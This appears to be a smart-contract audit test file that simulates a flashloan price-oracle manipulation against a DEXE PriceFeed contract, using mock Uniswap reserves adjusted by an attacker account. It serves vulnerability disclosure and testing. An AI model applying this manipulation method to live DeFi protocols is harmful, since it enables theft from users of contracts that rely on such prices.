// SPDX-License-Identifier: MIT
const { assert } = require("chai");
const { toBN, accounts, wei } = require("../../scripts/utils/utils");
const Reverter = require("../helpers/reverter");

const ContractsRegistry = artifacts.require("ContractsRegistry");
const PriceFeed = artifacts.require("PriceFeed");
const UniswapPathFinderLib = artifacts.require("UniswapPathFinder");
const UniswapV2RouterMock = artifacts.require("UniswapV2RouterMock");
const UniswapV3QuoterMock = artifacts.require("UniswapV3QuoterMock");
const ERC20Mock = artifacts.require("ERC20Mock");
const WethMock = artifacts.require("WETHMock");
const BscProperties = artifacts.require("BSCProperties");
const SphereXEngineMock = artifacts.require("SphereXEngineMock");

// Configure BigNumber format
ContractsRegistry.numberFormat = "BigNumber";
PriceFeed.numberFormat = "BigNumber";
UniswapV2RouterMock.numberFormat = "BigNumber";
UniswapV3QuoterMock.numberFormat = "BigNumber";
ERC20Mock.numberFormat = "BigNumber";
WethMock.numberFormat = "BigNumber";
BscProperties.numberFormat = "BigNumber";

describe("PriceFeed Vulnerability Demonstration", () => {
  let tokensToMint = toBN(1000000000); // 1 billion tokens
  let reserveTokens = toBN(1000000); // 1 million tokens in liquidity

  let OWNER;
  let ATTACKER;

  let priceFeed;
  let uniswapV2Router;
  let DEXE;
  let USD;
  let WETH;

  const reverter = new Reverter();

  before("setup", async () => {
    OWNER = await accounts(0);
    ATTACKER = await accounts(1);

    // Deploy contracts
    const uniswapPathFinderLib = await UniswapPathFinderLib.new();
    await PriceFeed.link(uniswapPathFinderLib);

    const contractsRegistry = await ContractsRegistry.new();
    const _priceFeed = await PriceFeed.new();
    DEXE = await ERC20Mock.new("DEXE", "DEXE", 18);
    USD = await ERC20Mock.new("USD", "USD", 18);
    WETH = await WethMock.new();
    networkProperties = await BscProperties.new();
    uniswapV2Router = await UniswapV2RouterMock.new();
    uniswapV3Quoter = await UniswapV3QuoterMock.new();
    const _sphereXEngine = await SphereXEngineMock.new();

    // Initialize contracts
    await contractsRegistry.__MultiOwnableContractsRegistry_init();
    await networkProperties.__NetworkProperties_init(WETH.address);

    // Register contracts
    await contractsRegistry.addContract(await contractsRegistry.DEXE_NAME(), DEXE.address);
    await contractsRegistry.addContract(await contractsRegistry.USD_NAME(), USD.address);
    await contractsRegistry.addContract(await contractsRegistry.WETH_NAME(), WETH.address);
    await contractsRegistry.addContract(await contractsRegistry.NETWORK_PROPERTIES_NAME(), networkProperties.address);
    await contractsRegistry.addContract(await contractsRegistry.SPHEREX_ENGINE_NAME(), _sphereXEngine.address);
    await contractsRegistry.addProxyContract(await contractsRegistry.PRICE_FEED_NAME(), _priceFeed.address);

    priceFeed = await PriceFeed.at(await contractsRegistry.getPriceFeedContract());

    // Configure pool types
    defaultPoolTypes = [
      ["0", uniswapV2Router.address, "0"],
      ["1", uniswapV3Quoter.address, "500"],
      ["1", uniswapV3Quoter.address, "3000"],
      ["1", uniswapV3Quoter.address, "10000"],
    ];

    await priceFeed.__PriceFeed_init(defaultPoolTypes);
    await contractsRegistry.injectDependencies(await contractsRegistry.PRICE_FEED_NAME());

    // Setup initial tokens and liquidity
    await DEXE.mint(OWNER, wei(tokensToMint));
    await USD.mint(OWNER, wei(tokensToMint));

    // Setup liquidity
    await DEXE.approve(uniswapV2Router.address, wei(reserveTokens));
    await uniswapV2Router.setReserve(DEXE.address, wei(reserveTokens));

    await USD.approve(uniswapV2Router.address, wei(reserveTokens));
    await uniswapV2Router.setReserve(USD.address, wei(reserveTokens));

    // Enable direct pair
    await uniswapV2Router.enablePair(DEXE.address, USD.address);

    await reverter.snapshot();
  });

  afterEach(reverter.revert);

  it("should demonstrate price manipulation via reserve changes", async () => {
    // Get normal price
    const normalPrice = await priceFeed.getExtendedPriceOut.call(DEXE.address, USD.address, wei("1000"), [[], []]);
    const normalPriceUSD = normalPrice.amountOut.toString() / 1e18;
    console.log("Normal price for 1000 DEXE:", normalPriceUSD, "USD");

    // Prepare tokens for attacker
    await DEXE.mint(ATTACKER, wei(reserveTokens.times(10)));
    await DEXE.approve(uniswapV2Router.address, wei(reserveTokens.times(10)), { from: ATTACKER });

    await USD.mint(ATTACKER, wei(reserveTokens.times(10)));
    await USD.approve(uniswapV2Router.address, wei(reserveTokens.times(10)), { from: ATTACKER });

    // Manipulate reserves
    console.log("\n=== FLASHLOAN ATTACK SIMULATION ===");
    await uniswapV2Router.setReserve(DEXE.address, wei(reserveTokens.times(0.1)), { from: ATTACKER });
    console.log("DEXE reserve reduced to 10%");

    await uniswapV2Router.setReserve(USD.address, wei(reserveTokens.times(10)), { from: ATTACKER });
    console.log("USD reserve increased 10x");

    // Get manipulated price
    const manipulatedPrice = await priceFeed.getExtendedPriceOut.call(DEXE.address, USD.address, wei("1000"), [[], []]);
    const manipulatedPriceUSD = manipulatedPrice.amountOut.toString() / 1e18;
    console.log("Manipulated price for 1000 DEXE:", manipulatedPriceUSD, "USD");

    // Calculate price manipulation factor
    const factor = manipulatedPriceUSD / normalPriceUSD;
    console.log("Price manipulation factor:", factor.toFixed(2) + "x");

    // Verify price manipulation
    console.log("\n=== VULNERABILITY DEMONSTRATED ===");
    console.log("PriceFeed can be manipulated by temporarily changing token reserves");
    console.log("This could be exploited in a real attack using flashloans");
    console.log("Impact: Any contract using PriceFeed for pricing is vulnerable");

    // Return reserves to normal (as would happen after flashloan repayment)
    await uniswapV2Router.setReserve(DEXE.address, wei(reserveTokens), { from: ATTACKER });
    await uniswapV2Router.setReserve(USD.address, wei(reserveTokens), { from: ATTACKER });

    // Verify price returned to normal
    const finalPrice = await priceFeed.getExtendedPriceOut.call(DEXE.address, USD.address, wei("1000"), [[], []]);
    const finalPriceUSD = finalPrice.amountOut.toString() / 1e18;
    console.log("Price after attack:", finalPriceUSD, "USD");
  });
});
